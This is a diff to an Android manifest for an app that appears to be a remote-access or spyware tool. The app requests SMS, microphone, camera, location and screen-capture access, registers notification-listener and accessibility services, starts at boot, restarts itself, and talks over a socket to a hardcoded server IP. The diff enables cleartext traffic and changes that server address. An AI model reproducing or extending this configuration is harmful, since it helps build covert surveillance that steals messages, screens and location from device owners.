@@ -11,7 +11,6 @@
     <!-- Core Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.READ_SMS" />
@@ -22,6 +21,11 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
+    <!-- Android 13+ notifications permission -->
+    <uses-permission
+        android:name="android.permission.POST_NOTIFICATIONS"
+        android:required="false" />
 
     <permission
         android:name="com.example.ohhhhymn.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
@@ -38,14 +42,18 @@
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:theme="@style/Theme.AppCompat.Light.NoActionBar" >
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
+        android:usesCleartextTraffic="true" >
+
+        <!-- Static server configuration -->
         <meta-data
             android:name="SERVER_IP"
-            android:value="192.168.0.179" />
+            android:value="192.168.0.178" />
         <meta-data
             android:name="SERVER_PORT"
             android:value="54835" />
 
+        <!-- Entry activity -->
         <activity
             android:name="com.example.ohhhhymn.MainActivity"
             android:exported="true"
@@ -59,16 +67,21 @@
             </intent-filter>
         </activity>
 
+        <!-- Screen capture service -->
         <service
             android:name="com.example.ohhhhymn.ScreenCaptureService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="mediaProjection" />
+
+        <!-- Socket communication service -->
         <service
             android:name="com.example.ohhhhymn.SocketService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="mediaProjection|location" />
+
+        <!-- Notification listener -->
         <service
             android:name="com.example.ohhhhymn.MyNotificationListener"
             android:enabled="true"
@@ -78,6 +91,8 @@
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
+
+        <!-- Accessibility service -->
         <service
             android:name="com.example.ohhhhymn.MyAccessibilityService"
             android:enabled="true"
@@ -91,12 +106,15 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
+
+        <!-- Background restart job -->
         <service
             android:name="com.example.ohhhhymn.RestartJobService"
             android:enabled="true"
             android:exported="false"
             android:permission="android.permission.BIND_JOB_SERVICE" />
 
+        <!-- Boot receiver -->
         <receiver
             android:name="com.example.ohhhhymn.BootReceiver"
             android:enabled="true"
